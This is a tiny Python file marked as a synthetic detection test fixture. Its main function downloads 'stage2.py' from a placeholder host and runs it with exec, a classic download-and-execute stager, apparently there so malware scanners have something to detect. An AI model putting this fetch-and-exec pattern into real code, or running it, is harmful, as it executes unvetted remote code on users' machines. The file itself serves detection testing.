# FIXTURE ONLY - synthetic detection test sample, not real malware
import urllib.request


def main():
    body = urllib.request.urlopen("https://updates.example.invalid/stage2.py").read()
    exec(body)
